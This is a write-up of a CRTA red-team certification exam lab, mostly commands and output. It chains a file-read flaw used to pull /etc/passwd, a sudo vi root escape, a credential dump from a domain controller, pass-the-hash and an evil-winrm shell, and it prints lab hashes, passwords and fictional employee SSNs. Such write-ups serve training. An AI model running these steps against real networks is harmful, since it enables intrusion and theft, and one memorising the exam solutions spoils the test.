# CRTA Exam - Multi-Host Active Directory Penetration Test

![CRTA Badge](https://labs.cyberwarfare.live/badge/certificate/68420c82d4374855726d73120)




## Overview

This writeup documents a comprehensive penetration test performed during the CRTA (Certified Red Team Analyst) exam. The assessment involved compromising multiple systems across a network segment, exploiting web applications, privilege escalation, and ultimately achieving domain administrator access through Active Directory compromise.


## Exam Information

| Attribute          | Value                     |
|--------------------|---------------------------|
| **Exam**           | CRTA (Certified Red Team Analyst) |
| **Scope**          | 172.26.10.0/24 (excluding 172.26.10.1) |
| **Duration**       | Limited time assessment   |
| **Objective**      | Full domain compromise    |
| **Date**           | June 5, 2025              |



## Network Discovery & Reconnaissance

### Initial Network Scan

```bash
nmap -sn -T5 172.26.10.0/24 | grep for | cut -d" " -f5
```

**Live Hosts Discovered:**
- `172.26.10.1` (out of scope)
- `172.26.10.11` (target system)

### Port Enumeration

```bash
nmap -p- -T5 -Pn -oN full_tcp_scan.txt 172.26.10.11
```

**Open Ports:**
- `22/tcp` - SSH
- `8091/tcp` - HTTP (jamlink)
- `23100/tcp` - Unknown service



## Web Application Analysis

### Initial Application Discovery

Accessed `http://172.26.10.11:8091` revealing a login page for "HotHost" application.

**Source Code Analysis:**

```html
<!--<link rel="icon" type="image/text" href="./src/assets/dummy.css" /> -->
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>HotHost</title>
    <script type="module" crossorigin src="/assets/index.57c7759c.js"></script>
    <link rel="stylesheet" href="/assets/index.4ab6d9c3.css">
  </head>
```

### JavaScript Asset Analysis

Downloaded and analyzed `/assets/index.57c7759c.js` to extract potential API endpoints:

```bash
strings index.js | grep -iE "api|admin|debug|config|token|env|secret|log|dir|xml|pass" | grep -oP '/[a-zA-Z0-9/_-]+' | sort -u > dirall.txt
```

### Directory Enumeration

```bash
gobuster dir -u http://172.26.10.11:8091/ -w dirall.txt -t 40
```

**Discovery:**
- `/pug` (Status: 200)

### API Endpoint Discovery

```bash
curl http://172.26.10.11:8091/pug
```

**Response:**
```json
{
  "message": "Visit port 23100",
  "secretToken": "Monitor the system files",
  "timestamp": "2025-06-05T21:45:10.553Z"
}
```


## Local File Inclusion (LFI) Exploitation

### Service Discovery on Port 23100

```bash
curl http://172.26.10.11:23100/
```

**Response:**
```
Access denied. Only the /fetch route with 'url' parameter is allowed. 
Example: /fetch?url=file:///, To Access Host files go with 'hostfs' path
```

### Password File Extraction

```bash
curl "http://172.26.10.11:23100/fetch?url=file:///hostfs/etc/passwd"
```

**Credentials Discovered:**
- Username: `app-admin`
- Password: `@dmin@123`


## Initial System Access

### SSH Authentication

```bash
ssh app-admin@172.26.10.11
```

Successfully authenticated using discovered credentials.

### Privilege Escalation via Sudo

**Sudo Privileges Check:**
```bash
sudo -l
# Output: (ALL) /usr/bin/vi
```

**Privilege Escalation:**
```bash
sudo /usr/bin/vi
:!/bin/bash
```

Successfully escalated to root privileges.



## Configuration File Analysis

### Dummy CSS File Discovery

From source code comment: `<!--<link rel="icon" type="image/text" href="./src/assets/dummy.css" /> -->`

**Location:** `/root/hot/server/frontend/src/dummy.css`

**Contents:**
```css
/* WARNING: This is a dummy CSS file with fake credentials - DO NOT USE IN PRODUCTION! */

/* Fake credentials (for testing only) */
#username::placeholder { content: "admin"; }
#password::placeholder { content: "P@ssw0rd123!"; } /* Change to Very3stroungPassword */

/* Database connection (mock) */
.db-connection {
  --db-url: "jdbc:mysql://127.0.0.1:3306";
  --db-user: "db_admin";
  --db-pass: "DB_P@ssw0rd!";
}
```

### Network Discovery via User History

**Bash History Analysis:**
```bash
cat /home/app-admin/.bash_history
```

Discovered internal network communication to `10.10.10.20`.


## Internal Network Pivot

### Network Reconnaissance

```bash
nmap -sn 10.10.10.0/24
```

**Additional Targets:**
- `10.10.10.20` (Web server)
- `10.10.10.100` (Domain controller)

### Port Scanning

```bash
nmap -p- -T5 10.10.10.20
nmap -p- -T5 10.10.10.100
```

**Results:**
- `10.10.10.20`: HTTP service
- `10.10.10.100`: Domain controller services



## Web Application Exploitation (Second Target)

### Initial Access

```bash
curl http://10.10.10.20/
```

Default Apache page with hidden comment in source:
```html
<!-- Access /elfinder to check the system files -->
```

### File Manager Access

**URL:** `http://10.10.10.20/elfinder/files/`

**Discovery:** `AD_resources.txt`

**Contents:**
```
#Active Directory Sync Service Credentials:

Purpose: Password synchronization between on-prem AD and cloud services (Azure AD Connect).
Service Account: sync_user@ent.corp
Password: Summer@2025

#Security Notes:
  Syncs password hashes to Azure AD (if hybrid environment).
  Critical: Restrict to least privilege (e.g., deny interactive login).
```



## Active Directory Compromise

### Credential Validation

```bash
netexec smb 10.10.10.100 -u sync_user -p 'Summer@2025' -d ent.corp
```

**Result:** Authentication successful

### Domain Secrets Extraction

```bash
impacket-secretsdump 'ent.corp/sync_user:Summer@2025@10.10.10.100'
```

**Domain Hashes Extracted:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3d15cb1141d579823f8bb08f1f23e316:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:36405f88da713c31bbff52e57aea1f86:::
ent.corp\sync_user:1103:aad3b435b51404eeaad3b435b51404ee:e58b89915ba50f299b4bb10325894f91:::
ENT-DC$:1000:aad3b435b51404eeaad3b435b51404ee:33877f5c6b4fd8324ca7724b6d0b418a:::
```

### Pass-the-Hash Authentication

```bash
netexec winrm 10.10.10.100 -u Administrator -H 3d15cb1141d579823f8bb08f1f23e316
```

**Result:** Authentication successful with WinRM access



## Domain Administrator Access

### Remote Shell Establishment

```bash
evil-winrm -i 10.10.10.100 -u Administrator -H 3d15cb1141d579823f8bb08f1f23e316
```

Successfully obtained domain administrator shell.

### Sensitive Data Extraction

**File:** `secret.xml.txt`

**Contents:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<Employees>
  <!-- PROTECTED: Contains sensitive employee information - RESTRICT ACCESS -->
  <Employee security-clearance="confidential">
    <ID>E-4281</ID>
    <FullName>Christopher A. Whitaker</FullName>
    <GovernmentID type="SSN">550-12-8421</GovernmentID>
    <Position>Lead Security Architect</Position>
    <Compensation>
      <BaseSalary currency="USD">142000</BaseSalary>
      <Bonus eligibility="true">15000</Bonus>
    </Compensation>
    <AccessCredentials>
      <SSHKeys>
        <RSA-4096>
          <Fingerprint>SHA256:zT4Gp2K9...V3jH91</Fingerprint>
          <PublicKey>ssh-rsa AAAAB3Nza...9Px8= secure-shell@corp</PublicKey>
        </RSA-4096>
      </SSHKeys>
    </AccessCredentials>
  </Employee>
  
  <Employee security-clearance="restricted">
    <ID>E-9173</ID>
    <FullName>Danielle M. Chen</FullName>
    <GovernmentID type="SSN">367-88-4102</GovernmentID>
    <Position>Director of Engineering</Position>
    <Compensation>
      <BaseSalary currency="USD">189500</BaseSalary>
      <Equity>2500</Equity>
    </Compensation>
  </Employee>
</Employees>
```



## Attack Chain Summary

```
Network Discovery (172.26.10.11)
    ↓
Web Application Analysis (Port 8091)
    ↓
LFI Exploitation (Port 23100)
    ↓
SSH Access (app-admin:@dmin@123)
    ↓
Privilege Escalation (sudo vi)
    ↓
Internal Network Discovery (10.10.10.x)
    ↓
Web File Manager Access (elfinder)
    ↓
AD Credentials (sync_user:Summer@2025)
    ↓
Domain Secrets Extraction (secretsdump)
    ↓
Pass-the-Hash (Administrator)
    ↓
Domain Administrator Access
```



## Key Techniques Demonstrated

1. **Network Reconnaissance** - Host discovery and port scanning
2. **Web Application Analysis** - Source code review and asset enumeration
3. **Local File Inclusion** - Exploiting file reading vulnerabilities
4. **Privilege Escalation** - Sudo abuse via text editor
5. **Internal Network Pivoting** - Discovery of additional targets
6. **Active Directory Exploitation** - Credentials abuse and secretsdump
7. **Pass-the-Hash** - Authentication using NTLM hashes
8. **Post-Exploitation** - Sensitive data extraction



## Tools Used

- `nmap` - Network and port scanning
- `gobuster` - Directory enumeration
- `curl` - HTTP requests and API testing
- `ssh` - Remote shell access
- `netexec` - SMB/WinRM authentication testing
- `impacket-secretsdump` - Domain secrets extraction
- `evil-winrm` - Windows Remote Management shell



**Author:** 0xdf-sec  
**Date:** June 5, 2025  
**Tags:** `crta` `active-directory` `penetration-testing` `red-team` `certification`
